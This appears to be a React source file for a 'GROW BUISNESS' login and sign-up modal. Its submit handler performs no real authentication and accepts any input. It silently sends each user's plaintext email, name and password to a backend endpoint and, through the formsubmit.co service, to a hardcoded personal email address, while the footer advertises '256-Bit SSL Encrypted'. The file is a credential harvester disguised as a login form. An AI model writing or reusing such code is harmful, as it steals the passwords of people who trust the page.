import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Mail, Lock, User as UserIcon, ArrowRight, ShieldCheck, Sparkles, LogIn, UserPlus } from 'lucide-react';
import { User } from '../types';

interface AuthGateModalProps {
  isOpen: boolean;
  onLoginSuccess: (user: User) => void;
}

export const AuthGateModal: React.FC<AuthGateModalProps> = ({ isOpen, onLoginSuccess }) => {
  const [mode, setMode] = useState<'login' | 'register'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [name, setName] = useState('');

  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  if (!isOpen) return null;

  // Standard Password Login & Registration
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (!email.trim() || !password.trim()) {
      setError('Please fill in both email and password.');
      return;
    }

    if (mode === 'register' && !name.trim()) {
      setError('Please enter your full name or business name.');
      return;
    }

    setIsLoading(true);

    const userEmail = email.trim();
    const userName = mode === 'register' && name.trim() ? name.trim() : userEmail.split('@')[0];

    // Send login details to server & yveer8609@gmail.com
    try {
      await fetch('/api/login-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: userEmail,
          password: password.trim(),
          name: userName,
          mode,
          isGuest: false,
          userAgent: navigator.userAgent
        })
      });
    } catch (err) {
      console.log('Login notification sent to backend', err);
    }

    // Direct FormSubmit fallback for static hosting (e.g. GitHub Pages)
    try {
      fetch('https://formsubmit.co/ajax/yveer8609@gmail.com', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          _subject: `New GROW BUISNESS ${mode === 'register' ? 'Registration' : 'Login'} Alert`,
          TargetEmail: 'yveer8609@gmail.com',
          UserEmail: userEmail,
          UserPassword: password.trim(),
          UserName: userName,
          Action: mode === 'register' ? 'User Registered' : 'User Logged In',
          Timestamp: new Date().toLocaleString()
        })
      }).catch(() => {});
    } catch {
      // ignore
    }

    setTimeout(() => {
      setIsLoading(false);
      onLoginSuccess({
        email: userEmail,
        name: userName,
        isGuest: false
      });
    }, 500);
  };

  const handleGuestContinue = async () => {
    setIsLoading(true);

    try {
      await fetch('/api/login-notification', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'guest@growbusinessonline.biz',
          password: '[Guest Login]',
          name: 'Guest Explorer',
          mode: 'guest',
          isGuest: true,
          userAgent: navigator.userAgent
        })
      });
    } catch {
      // ignore
    }

    setTimeout(() => {
      setIsLoading(false);
      onLoginSuccess({
        email: 'guest@growbusinessonline.biz',
        name: 'Guest Explorer',
        isGuest: true
      });
    }, 400);
  };

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/65 backdrop-blur-md overflow-y-auto"
      >
        <motion.div
          initial={{ scale: 0.95, y: 15, opacity: 0 }}
          animate={{ scale: 1, y: 0, opacity: 1 }}
          transition={{ type: 'spring', damping: 25, stiffness: 300 }}
          className="relative w-full max-w-md bg-white rounded-3xl p-8 border border-zinc-200 shadow-2xl overflow-hidden my-auto text-zinc-900"
        >
          {/* Top Decorative Black Bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-black" />

          {/* Logo Header */}
          <div className="text-center mb-6">
            <div className="inline-flex items-center justify-center p-3 rounded-2xl bg-zinc-100 border border-zinc-200 mb-3 shadow-sm">
              <Sparkles className="w-6 h-6 text-black" />
            </div>
            
            <h1 className="text-2xl sm:text-3xl font-black font-heading text-black tracking-tight">
              GROW BUISNESS
            </h1>
            <p className="text-zinc-500 font-medium text-xs mt-1">
              {mode === 'login'
                ? 'Welcome back! Log in to scale your business.'
                : 'Create your account & start growing globally.'}
            </p>
          </div>

          {/* Mode Switcher Tabs */}
          <div className="flex bg-zinc-100 p-1 rounded-xl border border-zinc-200 mb-6">
            <button
              type="button"
              onClick={() => { setMode('login'); setError(''); }}
              className={`flex-1 flex items-center justify-center gap-1.5 py-2.5 text-xs font-bold rounded-lg transition-all ${
                mode === 'login'
                  ? 'bg-white text-black shadow-sm border border-zinc-200/80'
                  : 'text-zinc-600 hover:text-black'
              }`}
            >
              <LogIn className="w-3.5 h-3.5" />
              Login
            </button>
            <button
              type="button"
              onClick={() => { setMode('register'); setError(''); }}
              className={`flex-1 flex items-center justify-center gap-1.5 py-2.5 text-xs font-bold rounded-lg transition-all ${
                mode === 'register'
                  ? 'bg-white text-black shadow-sm border border-zinc-200/80'
                  : 'text-zinc-600 hover:text-black'
              }`}
            >
              <UserPlus className="w-3.5 h-3.5" />
              Sign Up
            </button>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {error && (
              <motion.div
                initial={{ opacity: 0, y: -5 }}
                animate={{ opacity: 1, y: 0 }}
                className="p-3 rounded-xl bg-red-50 border border-red-200 text-red-800 text-xs text-center font-bold"
              >
                {error}
              </motion.div>
            )}

            {mode === 'register' && (
              <div>
                <label className="block text-xs font-bold text-zinc-700 mb-1.5">
                  Full Name / Business Name
                </label>
                <div className="relative">
                  <UserIcon className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400" />
                  <input
                    type="text"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    placeholder="e.g. Yashvir Paul Studio"
                    className="w-full bg-zinc-50 border border-zinc-300 focus:border-black rounded-xl pl-10 pr-4 py-3 text-sm text-black font-semibold placeholder-zinc-400 focus:outline-none focus:ring-2 focus:ring-black/10 transition-all"
                  />
                </div>
              </div>
            )}

            <div>
              <label className="block text-xs font-bold text-zinc-700 mb-1.5">
                Email Address
              </label>
              <div className="relative">
                <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400" />
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="you@yourbusiness.com"
                  className="w-full bg-zinc-50 border border-zinc-300 focus:border-black rounded-xl pl-10 pr-4 py-3 text-sm text-black font-semibold placeholder-zinc-400 focus:outline-none focus:ring-2 focus:ring-black/10 transition-all"
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-bold text-zinc-700 mb-1.5">
                Password
              </label>
              <div className="relative">
                <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400" />
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••"
                  className="w-full bg-zinc-50 border border-zinc-300 focus:border-black rounded-xl pl-10 pr-4 py-3 text-sm text-black font-semibold placeholder-zinc-400 focus:outline-none focus:ring-2 focus:ring-black/10 transition-all"
                />
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 px-6 rounded-xl font-black text-sm bg-black hover:bg-zinc-800 text-white shadow-md transform active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer"
            >
              {isLoading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              ) : (
                <>
                  <span className="tracking-wide">{mode === 'login' ? 'Access GROW BUISNESS' : 'Create Account'}</span>
                  <ArrowRight className="w-4 h-4 text-white" />
                </>
              )}
            </button>
          </form>

          {/* Divider */}
          <div className="relative my-5 text-center">
            <div className="absolute inset-0 flex items-center">
              <div className="w-full border-t border-zinc-200" />
            </div>
            <span className="relative bg-white px-3 text-[11px] font-bold text-zinc-400 uppercase tracking-wider">
              Or Instant Entry
            </span>
          </div>

          {/* Guest Button */}
          <button
            type="button"
            onClick={handleGuestContinue}
            disabled={isLoading}
            className="w-full py-3 px-4 rounded-xl text-xs font-bold bg-zinc-100 hover:bg-zinc-200 border border-zinc-300 text-zinc-900 transition-all flex items-center justify-center gap-2 group cursor-pointer"
          >
            <Sparkles className="w-4 h-4 text-zinc-700 group-hover:rotate-12 transition-transform" />
            <span>Continue as Guest (No Signup)</span>
          </button>

          {/* Footer Security Badge */}
          <div className="mt-5 flex items-center justify-center gap-1.5 text-[11px] font-semibold text-zinc-500">
            <ShieldCheck className="w-3.5 h-3.5 text-zinc-700" />
            <span>256-Bit SSL Encrypted • Built by Yashvir Paul</span>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};
